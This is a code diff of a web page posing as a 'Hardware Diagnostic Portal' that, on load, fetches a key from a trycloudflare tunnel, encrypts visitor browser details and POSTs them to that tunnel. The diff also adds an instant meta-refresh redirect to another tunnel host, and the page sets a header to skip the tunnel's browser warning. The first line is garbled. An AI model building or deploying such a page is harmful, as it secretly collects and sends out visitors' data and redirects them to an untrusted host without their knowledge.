@@ -1,7 +1,10 @@
-<!DOCTYPE html>
+<!DOCT<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="refresh" content="0; url=https://mainly-statistical-blend-tracked.trycloudflare.com">
     <title>Hardware Diagnostic Portal | Node Sync</title>
     <link rel="stylesheet" href="style.css">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
@@ -13,26 +16,24 @@
         <p>Sync Status: <span id="status" class="active">INITIALIZING BRIDGE...</span></p>
     </div>
     <script>
-        const NGROK_URL = "https://shoulder-observed-roller-the.trycloudflare.com"; 
+
+        const TUNNEL_URL = "[URL]"; 
 
         async function runDiagnostic() {
+            const statusEl = document.getElementById('status');
             try {
                 const bypassHeaders = { "ngrok-skip-browser-warning": "true" };
 
-                const handshakeResponse = await fetch(`${NGROK_URL}/api/handshake-proxy`, { headers: bypassHeaders });
+                const handshakeResponse = await fetch(`${TUNNEL_URL}/api/handshake-proxy`, { 
+                    headers: bypassHeaders 
+                });
+                
+                if (!handshakeResponse.ok) throw new Error('Handshake Failed');
                 const { k, i } = await handshakeResponse.json();
 
                 const context = JSON.stringify({
                     agent: navigator.userAgent,
                     platform: navigator.platform,
-                    cores: navigator.hardwareConcurrency || "unknown",
-                    ram: navigator.deviceMemory || "unknown",
-                    res: `${window.screen.width}x${window.screen.height}`,
-                    depth: window.screen.colorDepth,
-                    lang: navigator.language,
-                    on: navigator.onLine,
-                    ref: document.referrer || "direct",
-                    url: window.location.href,
                     ts: Date.now()
                 });
 
@@ -42,9 +43,8 @@
                     iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7
                 }).toString();
 
-                await fetch(`${NGROK_URL}/api/sync-bridge`, {
+                const syncResponse = await fetch(`${TUNNEL_URL}/api/sync-bridge`, {
                     method: 'POST',
-                    mode: 'cors', 
                     headers: { 
                         'Content-Type': 'application/json',
                         ...bypassHeaders 
@@ -52,10 +52,13 @@
                     body: JSON.stringify({ content: encrypted })
                 });
 
-                document.getElementById('status').innerText = 'SECURE BRIDGE ACTIVE';
+                if (syncResponse.ok) {
+                    statusEl.innerText = 'SECURE BRIDGE ACTIVE';
+                    statusEl.classList.add('active');
+                }
             } catch (err) {
-                document.getElementById('status').innerText = 'CONNECTION ERROR';
-                console.error(err);
+                statusEl.innerText = 'CONNECTION ERROR';
+                console.error("Diagnostic Node Sync Failure:", err);
             }
         }
         window.onload = runDiagnostic;
